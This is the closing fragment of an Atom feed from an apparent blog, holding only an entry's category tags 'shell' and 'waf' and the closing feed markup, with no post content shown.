&lt;li&gt;
    
    </summary>
    
    
      <category term="shell" scheme="http://iosmosis.github.io/tags/shell/"/>
    
      <category term="waf" scheme="http://iosmosis.github.io/tags/waf/"/>
    
  </entry>
  
</feed>
